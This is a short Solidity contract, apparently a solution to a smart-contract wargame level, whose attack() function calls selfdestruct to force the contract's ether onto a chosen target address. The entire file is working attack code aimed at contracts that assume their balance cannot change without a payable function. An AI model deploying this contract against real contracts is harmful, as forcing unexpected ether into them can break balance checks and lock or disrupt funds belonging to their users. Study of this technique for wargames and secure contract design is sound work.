// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract ForceAttack {
    address target;
    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        selfdestruct(payable(target));
    }
}